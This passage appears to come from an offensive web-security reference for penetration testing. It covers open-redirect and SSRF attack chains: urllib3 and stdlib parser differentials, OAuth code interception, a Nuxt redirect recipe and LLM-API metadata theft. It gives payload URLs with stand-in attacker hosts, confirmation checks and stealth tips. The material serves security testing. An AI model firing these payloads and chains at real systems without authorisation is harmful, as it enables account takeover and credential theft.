- **Routing:** this file § CVE-2025-50181 → `ssrf.md § Server-Side Request Primitives` → `cloud/aws.md § EC2 Metadata Service` for IAM-adjacent primitives.

### Chain: measured parser-differential (backslash) + Python-stdlib validator + urllib3 fetcher → loopback SSRF

- **Upstream node:** target uses `urllib.parse` for allowlist validation and urllib3 for the actual HTTP dispatch (common pattern in middleware).
- **Successor precondition:** craft URL `http://127.0.0.1:<port>\@trusted.example.com/path` or `http://localhost:<port>\@trusted.example.com/path`.
- **Postcondition of successor:** stdlib's `urlsplit().hostname` extracts `trusted.example.com` (passes allowlist); urllib3's `parse_url().host` extracts `127.0.0.1` or `localhost`.
- **Terminal precondition:** urllib3's PoolManager dispatches to the extracted host.
- **Terminal postcondition:** fetcher reaches the internal target; response (if returned to the attacker) leaks internal content.
- **Routing:** this file § Measured 2026 URL-Parser Differentials → `ssrf.md § Loopback and Private IP Discovery`.

### Chain: open redirect (any variant) → OAuth code interception → account access

- **Upstream node:** registered OAuth client with an exact `redirect_uri` on a host that also hosts an open redirect (any of the primitives above).
- **Successor precondition:** issue authorization request with `redirect_uri = https://registered.host/<open-redirector-path>?url=https://attacker.tld/`.
- **Postcondition of successor:** authorization code lands at the registered host (passes exact match); registered host immediately 302s to attacker.tld with code preserved in the query.
- **Terminal precondition:** attacker captures the code; exchanges at the token endpoint (as the client or via client-impersonation path).
- **Terminal postcondition:** full account access.
- **Routing:** this file (any mechanism) → `authentication_jwt_advanced_deep.md § OIDC Mix-Up` for the token-endpoint depth → `authentication_jwt.md` for token manipulation.

### Chain: Clearance CVE-2021-23435 pattern + modern Rails app → full phishing

- **Upstream node:** modern Rails app with a login-return-to flow using `URI.parse` + host-only validation (CVE-2021-23435-pattern survivor).
- **Successor precondition:** craft a return-to with multi-leading-slash encoding.
- **Postcondition of successor:** validator sees allowed host; browser navigates to attacker.
- **Terminal postcondition:** post-login phishing against the authenticated user.
- **Routing:** this file § CVE-2021-23435 → `vulnerabilities/semantic_confusion.md` for the parser-vs-browser general case.

### Chain: URL-parser-disagreement (vLLM CVE-2026-25960 shape) + LLM API host → model-storage leak

- **Upstream node:** target LLM-API deployment (vLLM, LangChain-hosted LLM, custom LLM proxy) with a URL-parser mismatch between validator and fetcher.
- **Successor precondition:** craft URL exploiting the specific parser pair.
- **Postcondition of successor:** fetcher reaches internal model-storage, metadata-service, or sibling pod.
- **Terminal precondition:** fetcher's response reflects to attacker (if the LLM-service returns the fetched content) or produces an observable side-effect.
- **Terminal postcondition:** model-storage content leak, or chain into cloud-metadata credential theft.
- **Routing:** this file § URL-Parser-Disagreement SSRF → `cloud/aws.md`, `cloud/gcp.md`, or `cloud/azure.md` for metadata-service specifics → `vulnerabilities/agentic_system_security.md` for the LLM-API-specific exposure.

### Chain: OAuth 2.1 transition deployment + policy disagreement → cross-endpoint code hijack

- **Upstream node:** target OAuth deployment in mid-adoption of RFC 9700 — some endpoints enforce strict `redirect_uri` matching, others still permit regex or prefix.
- **Successor precondition:** identify the non-strict endpoint; issue an authorization request there with attacker-friendly URL.
- **Postcondition of successor:** code issued to attacker URL.
- **Terminal precondition:** present the code at the strict-mode token endpoint (which may or may not enforce the same URL-match on exchange).
- **Terminal postcondition:** depending on token-endpoint enforcement, either exchange succeeds (full access) or fails (bounded to code-capture-only).
- **Routing:** this file § OAuth 2.1 / RFC 9700 Shift → `authentication_jwt_novel_deep.md § RFC 9700 / OAuth 2.1 BCP Shift` for the token-layer implications.

## Confirmation Predicate for 2024–2026 Primitives

Each 2024–2026 primitive has a confirmation predicate — the exact signal that proves the target is on the vulnerable code path.

**CVE-2024-52289 (authentik).** Predicate: present an authorization request with `redirect_uri` matching a single-character-substituted variant of a registered URI. Positive confirmation = the server redirects the browser to the attacker-chosen domain with a `code` parameter. Negative control: an obviously-malicious URI with no character-substitution (`https://evil.com/callback`) should still reject on the pre-fix build — the primitive is specifically the metachar-regex-bypass, not any arbitrary URI.

**CVE-2025-50181 (urllib3 retries-does-not-disable-redirects).** Predicate: in a target that uses urllib3's `PoolManager(retries=False)`, trigger a fetch to an attacker-controlled URL that returns a 302 with `Location: http://internal/`. Positive confirmation = the fetcher reaches the internal address. Negative control: a target on urllib3 2.5.0+ with the same `retries=False` setting returns the 302 to the caller without following.

**CVE-2025-50182 (urllib3 Pyodide/Node redirect-mismatch).** Predicate: run the vulnerable pattern in a Pyodide / Node-interop environment; observe response data divergence between pre-fix (follow) and post-fix (don't follow) versions.

**CVE-2026-25960 (vLLM parser-disagreement SSRF).** Predicate: present a URL exploiting the specific parser-pair divergence (urllib3-vs-yarl). Positive confirmation = fetcher reaches the internal target with a response time matching that target.

**Measured urllib3 scheme-less-host primitive.** Predicate: present `localhost/secret.txt` or `localhost/<any>` to a target using stdlib validator + urllib3 fetcher. Positive confirmation = urllib3 dispatches to localhost; stdlib validator's `hostname is None` check passed the string through.

**Measured urllib3 backslash-as-authority primitive.** Predicate: present `http://<internal>:<port>\@<trusted>.example.com/<path>` to a target using stdlib validator + urllib3 fetcher. Positive confirmation = urllib3 dispatches to the internal host; stdlib validator's `hostname='<trusted>.example.com'` passed the allowlist.

### Nuxt `navigateTo` Server-Side Open Redirect (CVE-2026-56326)

| Branch | Affected | Fixed |
|---|---|---|
| 4.x | 4.0.0 – 4.4.6 | 4.4.7 |
| 3.x | ≤ 3.21.6 | 3.21.7 |

**Mechanism:** `navigateTo` fails to validate path-normalized payloads like `/..//evil.com` and `/.//evil.com`. The external-host check operates on the raw string, but the redirect target is resolved after path normalization — the normalization step re-introduces the attacker-controlled host.

**Attack recipe:**
```http
GET /redirect?url=/..//evil.com HTTP/1.1
Host: target.nuxt.app
```

**Confirmation:** 302 response with `Location:` pointing to `evil.com` (or the attacker-controlled domain). A same-origin redirect or 4xx means the primitive does not apply.

**Impact:** OAuth code interception (if the redirect is in an OAuth flow), phishing, session-token exfiltration via `Referer`.

**Sibling note:** CVE-2026-56317 and CVE-2026-53722 (same version scope) are SSR XSS — class `xss`, covered in `xss_novel_deep.md`.

## Pro Tips — Frontier

1. Fingerprint the target's validator parser and fetcher parser independently. Validators often use `urllib`/`rfc3986`; fetchers often use `urllib3`/`requests`/`httpx`/`aiohttp`. The pair-asymmetry is the attack surface.

2. For authentik, the `/-/about` endpoint reveals version; the OIDC metadata reveals the authorization endpoint path shape. If the version is in the vulnerable range, the metachar bypass is a one-request confirmation.

3. For urllib3 CVE-2025-50181, the attack requires the application to use `retries=False` as a security control. Audit the target's codebase (or infer from behavior) for this pattern.

4. The measured backslash primitive reproduces on current CPython 3.12/3.13 + urllib3 2.8.0. Treat Python-adjacent middleware as susceptible unless the validator and fetcher are explicitly aligned.

5. Do NOT fire the URL-encoded loopback primitive (`%67oogle.com`, `%31%32%37...`) — the deep-research pass refuted it 0-3; it does not reproduce on current CPython + urllib3. Firing produces false negatives and burns stealth budget.

6. The OAuth 2.1 / RFC 9700 strict-match shift is in-progress — target deployments are often mid-adoption. Audit the discovery metadata and probe multiple endpoints (authorize, token, logout, backchannel-logout) for enforcement consistency.

7. For LLM-API deployments, URL-parser-disagreement SSRF is a specific-but-real class. The vLLM CVE is one instance; sibling deployments (custom LLM proxies, LangChain-hosted services, MLOps platforms) are candidates.

8. Chain the frontier primitives through the OAuth code-interception path when the target is OAuth-adjacent — the open-redirect primitive is one hop; the exploit is the chain.

9. Combine with cache-poisoning for multi-user impact — a cached 302 reaches every subsequent requester of the same URL.

10. For blind chain confirmations, use interactsh or Burp Collaborator for OOB — the attacker-reachable URL in the open-redirect target becomes the signal.

## Summary

The 2024–2026 open-redirect frontier is dominated by three dynamics: configuration-string-as-regex bugs that produce metacharacter allowlist bypasses (authentik CVE-2024-52289), library-level redirect-control semantics that disagree across backends and configuration flags (urllib3 CVE-2025-50181 and CVE-2025-50182), and the enduring Claroty/Snyk 16-library parser-disagreement class — now with measured 2026 reproduction on current CPython + urllib3 showing the primitive is live, including a demonstrated loopback-dispatch SSRF. The OAuth 2.1 / RFC 9700 strict-redirect-URI shift closes the pattern-match attack surface at conformant endpoints but leaves transition deployments with policy-disagreement exposure. Chains run through OAuth code interception, SSRF to metadata services, and LLM-adjacent URL-parser disagreements — the open redirect is one hop; the exploit is the chain.
